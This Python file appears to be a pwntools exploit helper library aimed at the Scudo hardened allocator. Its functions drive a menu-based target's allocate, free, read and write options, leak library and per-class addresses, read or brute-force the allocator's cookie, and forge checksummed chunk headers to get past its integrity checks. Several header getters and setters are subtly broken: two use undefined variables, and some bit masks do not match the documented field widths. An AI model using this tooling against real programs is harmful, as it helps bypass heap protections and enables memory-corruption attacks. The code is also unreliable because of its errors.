from pwn import *
from z3 import *
from scudocookie import bruteforce, calc_checksum
from crc32c import crc32c


def malloc(io, size, data=b""):
    io.send(b"1\n")
    io.sendafter(b"allocate: ", f"{size}\n".encode())
    chunk = io.recvline()
    index = chunk.split(b' ')[4]
    address = int(chunk.split(b' ')[7], 16)
    if len(data) != 0:
        io.sendafter(b"quit\n", b"3\n")
        io.sendafter(b"address: ", b"2\n")
        io.sendafter(b"address: ", f"{hex(address)}\n".encode())
        io.sendafter(b"write: ", f"{len(data)}\n".encode())
        io.sendafter(b"write: ", data)
        io.send(b"\n")
    return (index, address)

# Send the "free" option, send the address
def free(io, address):
    io.send(b"2\n")
    io.sendafter(b"address: ", b"2\n")
    io.sendafter(b"address: ", f"{hex(address)}\n".encode())

def write(io, address, data):
    io.send(b"3\n")
    io.sendafter(b"address: ", b"2\n")
    io.sendafter(b"address: ", f"{hex(address)}\n".encode())
    io.sendafter(b"write: ", f"{len(data)}\n".encode())
    io.sendafter(b"write: ", data)
    io.send(b"\n")

def read(io, address, size):
    io.send(b"4\n")
    io.sendafter(b"address: ", b"2\n")
    io.sendafter(b"address: ", f"{hex(address)}\n".encode())
    io.sendafter(b"read: ", f"{size}\n".encode())
    res = []
    for i in range((size//16)):
        res += [int(x, base=16) for x in io.recvline(keepends=False).split(b' ') if x != b'']
    return res

def get_libscudo_base(io, SCUDO_LIB ):
    scudo_base = io.libs()[os.path.realpath(SCUDO_LIB)]
    return scudo_base

def get_perclass_base(io, scudo_lib, class_id=0):
    perclass_base = read(io, get_libscudo_base(io, scudo_lib) + 0x36000 + 0x48, 0x10)[0] - 0x2d00 
    print(f'perclass base leak: {hex(perclass_base)}')
    return perclass_base + (class_id * 0x100)

def get_libc_base(io):
    pass

def get_cookie_cheat(io, scudo_base):
    cookie = read(io, scudo_base+0x36000, 0x10)[0] # offset for libscudo-linux.so (md5sum: 6a1cb7efd0595861c21ca3cbd35e1657)
    return cookie 

def forge_header(address, cookie, new_header) -> bytes:
    new_checksum = calc_checksum(address, cookie, new_header)
    forged_header = new_header + (new_checksum << 0x30)
    return forged_header.to_bytes(8, 'little')

def bruteforce_cookie(io, addr):
    header = read(io, addr-0x10, 0x10)[0]

    checksum = header >> 0x30
    header = header & ((1 << 0x30)-1)
    cookie = bruteforce(addr, checksum, header)

    return cookie
    
def getLeak(io):
    io.recvuntil(b": ")
    address = int(io.recvline(keepends=False), base=16)
    io.recvuntil(b": ")
    header = int(io.recvline(keepends=False), base=16)

    checksum = header >> 0x30

    info(f"Address: {hex(address)} has header: {hex(header)} with checksum: {hex(checksum)}")

    return (address, header, checksum)
 
def populate_quarantine(io):
    for i in range(0x1000):
        free(io, malloc(io, 0x20+i)[1])
 
def create_header(class_id, size, state, origin=0, offset=0) -> int:
    """
    Create numberic header value from attributes

    :param int class_id: The Class ID for the chunk
    :param int size: The Size for the chunk
    :param int state: The state of the chunk (Available = 0, Allocated = 1, Quarantined = 2)
    :param int origin: Origin of the allocation (Malloc = 0, New = 1, NewArray = 2, Memalign = 3)
    :param int offset: The offset of the allocation due to alignment
    :return: The combined header number
    """
    return class_id + (state << 8) + (origin << 10) + (size << 12) + (offset << 32)

def header_get_offset(header) -> int:
    return (header >> 32) & ((1 << 16) - 1)

def header_get_size(header) -> int:
    return (header >> 12) & ((1 << 20) - 1)

def header_get_origin(header) -> int:
    return (origin >> 10) & 0b11

def header_get_state(header) -> int:
    return (state >> 8) & 0b11

def header_get_class_id(header) -> int:
    return header & ((1 << 8) - 1)

def header_set_offset(header, offset) -> int:
    return (header & ((1 << 32) - 1)) + (offset << 32)

def header_set_size(header, size) -> int:
    return (header & ~(0x8ffff << 12)) + (size << 12)

def header_set_origin(header, origin) -> int:
    return (header & ~(0b11 << 10)) + (origin << 10)

def header_set_state(header, state) -> int:
    return (header & ~(0b11 << 8)) + (state << 8)

def header_set_class_id(header, class_id) -> int:
    return (header & ~0xf) + class_id
